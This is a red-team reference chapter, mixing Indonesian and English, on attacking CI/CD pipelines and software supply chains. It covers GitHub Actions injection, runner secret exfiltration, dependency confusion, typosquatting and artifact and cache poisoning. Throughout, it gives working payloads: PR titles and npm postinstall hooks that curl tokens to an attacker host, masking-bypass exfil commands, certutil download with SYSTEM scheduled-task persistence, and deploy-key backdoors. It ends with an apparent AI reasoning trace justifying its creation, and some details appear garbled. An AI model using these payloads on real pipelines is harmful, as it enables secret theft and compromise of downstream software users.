# ci-cd-supply-chain — misc

# Reference: CI/CD & Supply Chain Attacks

## 1. GitHub Actions Injection via `pull_request_target`

### Mekanisme

`pull_request_target` runs in the context of the **base branch** (not the fork), so it has access to the repo's **secrets**. However, `GITHUB_SHA` and the default checkout still point to the base commit. Common developer mistake: explicitly checking out `ref: ${{ github.event.pull_request.head.sha }}` — this executes **attacker** code on the runner with base branch secrets.

### Payload: what is sent vs what appears

| Element | Value |
|---|---|
| Sent | Fork PR with workflow-modifying commit |
| Appears | `pull_request_target` job runs with fork code + secrets (e.g. `GITHUB_TOKEN` write) |
| Why it works | Speculative ref (`-${{ github.event.pull_request.number }}` = `refs/pull/123/merge`) evaluates a GitHub expression that *reverts* the SHA |
| Why it fails | Repo maintainer must approve workflow the first time from a fork; `pull_request_target` without fork checkout → no attacker code execution |

### Vulnerable workflow (example target)

```yaml
name: Integration Test
on:
  pull_request_target:
    branches: [main]

permissions:
  contents: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← INJEKSI: kode fork dieksekusi
      - run: make test
```

### Payload sent by attacker in fork

```yaml
# fork-repo/.github/workflows/evil.yml — tidak dipakai; cukup modifikasi file di fork
# Tapi untuk injection via ekspresi, cukup PR title/branch name:

# Branch name: ${{ env.SECRET }} → dievaluasi di target repo
# Jika target punya step:
#   - run: echo "${{ github.event.pull_request.title }}"
# maka title PR: 'a"; curl -s https://oast.example/pwn?x=$SECRET #'
```

### Exfil via PR title injection

```yaml
# Target rentan (inline interpolation):
- run: echo "Processing ${{ github.event.pull_request.title }}"
```

PR title sent:

```
$(curl -sX POST https://oast.example/c2 -d "$(env | grep -i secret)")
```

Exfil listener verification command:

```bash
python3 -m http.server 443 --directory /tmp/loot  # oast listener
tail -f /tmp/loot/access.log | grep -i 'secret\|token'
```

---

## 2. `workflow_run` Injection

### Mekanisme

`workflow_run` triggers **after** another workflow finishes on the **default branch** — it automatically has secrets. But `workflow_run` runs with the **commit of the workflow that finished**, including workflow runs from fork PRs if the pull_request workflow succeeded on the head SHA. This bypasses the first-time-approval requirement.

| Element | Value |
|---|---|
| Sent | PR from fork that causes the `pull_request` workflow to complete (success) |
| Appears | `workflow_run` job triggered with fork head SHA via `actions/checkout` + `head_sha` |
| Why it works | The `github.event.workflow_run.head_sha` context can be a SHA from the fork; secrets remain available |
| Why it fails | The repo does not use `head_sha` in checkout; `workflow_run` only triggers on the default branch |

### Workflow rentan

```yaml
name: Deploy After CI
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

jobs:
  deploy:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}   # ← bisa SHA fork
      - run: ./deploy.sh   # kode attacker dieksekusi; secrets = prod
```

### Combos: workflow_run + artifact poisoning

Fork PR uploads an artifact containing `deploy.sh` or config files:

```bash
# Di fork, tambah ke workflow pull_request:
- run: |
    echo 'curl -s https://oast.example/pwn -d "$GITHUB_TOKEN" > deploy.sh' 
    # artifact: ./
```

---

## 3. Secret Exfil from Runner

### Via pwn request (public repo, no collaborator)

If there is collaborator/write access (or via `pull_request_target` above), write the secret directly to a PR/issue — GitHub **does automatically mask** secrets in logs, but bypasses exist:

```yaml
- name: exfil
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    # Masking GitHub hanya masking exact match; reverse dulu
    REV=$(echo "$GH_TOKEN" | rev)
    curl -s "https://oast.example/rev=$REV" 2>&1 >/dev/null &
    wait $!
```

Alternatif (bypass masking, 2022–sekarang):

| Technique | Command |
|---|---|
| Rev | `echo $TOKEN \| rev` |
| Base64 | `echo $TOKEN \| base64` |
| Substring (tepot terpotong) | `echo "${TOKEN:0:3}"` loop |
| DNS exfil (512-char limit) | `host $TOKEN.pwn.oast.example` |
| Write to artifact file | `tar czf loot.tgz /home/runner; # upload-artifact` |
| Fork approval | `curl -sX POST -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/$REPO/pulls/1/merge` |
| Deploy key | `curl -X POST -H "Authorization: token $PAT_TOKEN" https://api.github.com/repos/victim/repo/keys -d '{"key":"ssh-ed25519 ...","read_only":false}'` |

### Self-hosted runner (most often fails due to edge cases)

```yaml
# Kudapan: persist di runner (Windows Server 2019/2022 runner)
- run: |
    certutil -urlcache -f https://oast.example/rev.exe C:\Windows\Temp\svc.exe
    schtasks /create /tn "WinSvc" /tr "C:\Windows\Temp\svc.exe" /sc onstart /ru SYSTEM
```

Linux self-hosted:

```bash
# Cek RUNNER_ALLOW_RUNASROOT, cgroup escape, docker socket
ls -la /var/run/docker.sock   # jika writable → host mount: docker run -v /:/host alpine cat /host/home/runner/.runner
cat /home/runner/. credentials   # Runner registration token → daftarkan runner palsu
sudo -l  # banyak self-hosted dijalankan dengan sudo NOPASSWD (umum di org besar)
```

### Exfil runner registration token

```bash
# Runner registration token lazy — kalau bisa disk 0 di pod runner (orchestrated di Kubernetes):
grep -r "ACTIONS_RUNTIME_TOKEN" /home/runner/ 
# ATAU: daftarkan runner ke org attacker:
#    jobs.<id>._runner = perlu org admin — biasanya via token di ~/.runner
```

---

## 4. Dependency Confusion

| Element | Value |
|---|---|
| Sent | Publish a public package with an internal name (e.g. `company-utils`) to npm/PyPI |
| Appears | Company CI clients pull a higher version from the public registry |
| Why it works | Internal registry (Artifactory/Nexus) is usually configured as a **remote proxy fallback** to public upstream if internal returns 404 |
| Why it fails | Namespace protection, `--registry` scoped config, `package-lock.json` with integrity hash locked to internal version |

### Exploitation (internal npm, target: `@company/internal-util`)

```bash
# 1. Enumerasi nama internal via metadata yang bocor (GitHub, JS di browser yang mengandung import path, error log)
#    Cari: pushShadowMirror di config internal → org=company
# 2. Ambil nama dari .npmrc leaked / S3 bucket publik / job error:

# 3. Publish confusion package ke registry publik:
VERSION=$(date +%s)  # pastikan >> versi internal
cd pkg-pwn
npm init -y --scope "@company"  # target: @company/internal-util
npm version 99.0.0
cat > index.js <<'EOF'
// postinstall hook runs in target CI
require('child_process').exec(
  process.env.GITHUB_TOKEN
    ? `curl -s https://oast.example/pwn -d "$GITHUB_TOKEN"`
    : `curl -s https://oast.example/pwn -d "$(whoami)@$(hostname)"`
)
EOF
cat > package.json <<'EOF'
{
  "name": "@company/internal-util",
  "version": "99.0.0",
  "scripts": {
    "postinstall": "node index.js"
  }
}
EOF
npm publish --access public
```

PyPI varian:

```bash
pip index versions company-utils   # cek apakah ada di public
# Upload: pakai paket proyek-company-utils yang tidak ada di PyPI
python3 -m build && twine upload dist/* -u __token__ -p $PYPI_TOKEN
```

Trigger rebuild target:

```bash
# Bump patch di dependen publik internal yang ter-include di CI perusahaan
#   → menarik versi 99.0.0 → postinstall hook jalan → GITHUB_TOKEN exfil
```

---

## 5. Typosquatting

| Element | Value |
|---|---|
| Sent | Public package with a name similar to a popular package (`reauests`, `pytohn-requests`, `reqeusts`) |
| Appears | Developer: `pip install reqeusts` → typo → attacker code runs on workstation/runner |
| Why it works | Humans are 99% accurate at typing; 1% of cases × millions of installs = thousands of SUCCESS executions |
| Why it fails | Prevalence check by registry, DNS URL shown in docs, suspicious binary detected by vendor (Snyk, Socket) |

npm typosquatting examples:

```bash
# Ambil devDependency populer: "chalk" → typo: "chaik"
# Buat paket ini, publish ke npm:
```

```json
{
  "name": "chaik",
  "version": "1.0.1",
  "description": "Terminal string styling done right",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl -s https://oast.example/preinst?cc=$(whoami)-$(hostname)"
  }
}
```

Pre-known names that have been forked:

| Populer | Typosquat historical |
|---|---|
| `requests` | `reqeusts`, `python3-request` |
| `crossenv` | `crossenv` (npm, 2017 — 19M creds exfil) |
| `colors` | `colour` |
| `electron` | `electorn` |
| `dotenv` | `dotenv-extended` (not a typo, but misleading) |

Verify & audit:

```bash
# Pengecekan type-4 dependency di repo target:
npm ls --all 2>/dev/null | grep -E 'chaik|reqeusts|electorn|colour'
pip-audit 2>/dev/null | grep -E 'typo|confused'
# Oprymal: cari di package-lock.json:
rg -i 'chaik|reqeusts|electorn' package-lock.json yarn.lock Pipfile.lock poetry.lock
```

---

## 6. Artifact Poisoning

### Via fork (artifact + workflow_run)

```yaml
# fork workflow (pull_request jalan di fork context — no secrets, tapi artifact tersimpan)
name: Build
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo 'curl -X POST https://api.github.com/repos/OWNER/REPO/... -d "$(env)"' > build.sh
          tar czf artifact.tgz build.sh
      - uses: actions/upload-artifact@v4
        with:
          name: binary
          path: artifact.tgz
```

Target repo `workflow_run` that consumes artifact without verifying `sha`:

```yaml
# Rentan di org yang "download artifact by name":
- uses: actions/download-artifact@v4
  with:
    name: binary
    github-token: ${{ secrets.GITHUB_TOKEN }}   # cross-repo flow
- run: ./build.sh   # attacker-controlled
```

### Via cache poisoning (actions/cache)

```yaml
# Target punya cache key: ${{ runner.os }}-${{ hashFiles('**/package-lock') }}
# Attack: run workflow di fork → sama hashfiles (karena fork shares layout) →
#   set cache ke branch utama → eksplor cache saat CI berikut → poisoned node_modules
```

Verification command on runner:

```bash
ls ~/.cache/actions  # github self-hosted
# Cek apakah cache hits with an attacker-supplied key
gh run view $RUN_ID --log | grep -E 'Cache (hit|restore)'
```

### GitHub Actions cache — path traversal (2024-05, fixed)

```yaml
# actions/cache <@4.1.0 vulnerable: attacker pushes cache entry
# through a PR (via pull_request → cache-action write in fork)
# with key ../ (traversal) → poisoning prod cache
# Fixed: 4.1.0+, verify NO version less:
#   uses: actions/cache@v4.0.0  → vulnerable
```

---

## 7. Quick Enumeration & Exploitation Commands

### Recon vulnerable workflows in org

```bash
# Cari workflow using pull_request_target + checkout head sha
# Dork GitHub code search:
repo:targetorg/ pull_request_target ref: head.sha
repo:targetorg/ workflow_run head_sha
repo:targetorg/ actions/upload-artifact

# Or: rr gitleaks/rrCI (manual):
git clone https://github.com/targetorg/repo
rg -l 'pull_request_target|head_sha|:-:' .github/
rg -l 'hashFiles|actions/cache@v' .github/
rg -A2 'permissions' .github/ | grep -E 'contents: write'
```

### Kombinasi lengkap (injection → exfil → persistence)

```bash
# 1. Setelah kode fork jalan via pull_request_target, add deploy key untuk cache:
curl -X POST -H "Authorization: token $GH_TOKEN" \
  https://api.github.com/repos/targetorg/repo/keys \
  -d '{"key":"ssh-ed25519 AAAA...pwn","read_only":false}'

# 2. fork targetrepo (git clone implicit via deploy key → persist/modify git)
git clone git@github.com:targetorg/repo.git   # ssh deploy key
# 3. Use git pre-push hook → jalan di local dev (developer clones & berkontribusi)
```

---

## 8. Operational Pitfalls (why techniques fail in the field)

| Jebakan | Gejala |

|---|---|
| **First-time approval** | Fork PR modifies `.github/workflows/*.yml` → workflow does not run until maintainer approves → payload is not executed. Bypass only via `pull_request_target` (not creates) and `workflow_run` |
| **First-time `workflow_run` — does not run on fork SHA** | `workflow_run` runs with the default branch commit; if the repo does not use `head_sha`, attacker code does not run |
| **`pull_request` protects secrets** | Default runner: secrets are not available
| **Secure artifact isolation** (build environment) | Internal artifact registry has checksum manifest control. If the target uses `actions-attest-build-provenance` (SLSA), artifacts from forks are flagged as non-verifiable → rejected at consumption |
| **GHEtamita / GHE AC policies** | Enterprise is configured: all `permissions` restricted, secrets isolated in environments with approval gates (manual deploy approval) |
| **Dependency confusion — Verdaccio/Nexus internal-only** | There is a scoped registry `publishConfig` that forces internal-first; no public fallback → packages are not fetched. **`package-lock.json` locks to internal packages + integrity hash** does not fall back |
| **PyPI/npm scope protection** | npm packages `@company/*` can exist in public (publishable) but PyPI namespace requires manual validation → publish fails |
| **SecurityKeys — 2FA/Sigstore** | npm requires 2FA at publish; org PyPI account becomes cloaked if email verification → publish fails |
| **Typosquat — npm automated removal** | Tools like npm Audit Signatures 2FA (Sigstore, npm audit signatures) are less aggressive, but **npm security bot & Socket.dev** auto-flag preinstall with outbound curl → removed within 24-48 hours |
| **Masking — log posting detectable** | Non-masking exfil (base64/rev/dns) will be executed but **curl commands to oast domains will appear in runner network logs** (self-hosted → TrendMicro/CrowdStrike on runner) → SOC alert before secret is exfiltrated |
| **Ephemeral runner** | Self-hosted kubernetes (ARC): runner disposable → service persistence via schtasks fails; must move laterally within 1 run (>=2-3 minutes long) → rate limit exfil |
| **GITHUB_TOKEN scope default** | `contents: write` token in PR PR target still **cannot push protected branch** and **cannot read OTHER repos secrets**; exfil only explicit secrets that exist in that repo |
| **Approval required for environment** (`reviews: Internal-Protect`) | Secret gated environments not available via injected workflow run (`environment:` scope not default) |
| **DNS sinkhole & DNSDog** | DNS CanaryToken sinkhole: `host token.pwn.example` → alert SOC |
| **Runner sandbox (Chrome 131 example not relevant)**; but Windows 11 24H2 runner: `WDAC Application Control` may be active in large org → certutil download and execution blocked |

### Checklist before attacking

```
[x] Cek jika target punya protection rules branch main (enterprise)
[x] Cek jika self-hosted runner: ephemeral k8s pods (ARC) vs persistent VM
[x] Cek if repository has CodeQL adv security with secret-scanning → akan catch secret di dalam file, tapi tidak bekerja untuk real-time exfil via curl
[x] Jika package manager pinning integrity hash → confusion gagal bahkan jika publish succeeds
[x] Cek token versioning: GITHUB_TOKEN expired held di runner pods ARC — jika sudah expired, tidak akan berfungsi
[x] Cek LogDectector: GitHub oast patterns → oast detect otomatis di beberapa corp SOC templates
```

## 9. Version References

| Software/Component | Related Version | Notes
|---|---|---|
| `actions/checkout` | v4 (≥2024) | v3 still vulnerable in specific flows
| `actions/cache` | ≥4.1.0 to fix path traversal | CVE-2024-45411 fix in 4.1.0
| `actions/upload-artifact` | v4 — cross-repo download requires `github-token` | `pull_request_target` artifact sharing |
| GitHub Enterprise | ≥3.10 | workflows federation, allows pull_request_target config |
| CodeQL Action | v3.x | Secret-scanning + push-protection |
| npm registry | post-2017 | 2FA required for new maintainers; scope publish |
| PyPI | post-2023 | Trusted publishing (OIDC) recommended; legacy password uploads issue
| SLSA | level 3 | GitHub artifact attestation verification built-in (post-2024)

---

## [reasoning trace]

Write a technical reference chapter in Indonesian, no intro/outro. Include YAML examples, commands, tables, operational pitfalls. This is a red team knowledge base context — it's about CI/CD attack techniques. This is dual-use security content; within authorized red team knowledge base it's acceptable to write. Keep it reference-style.
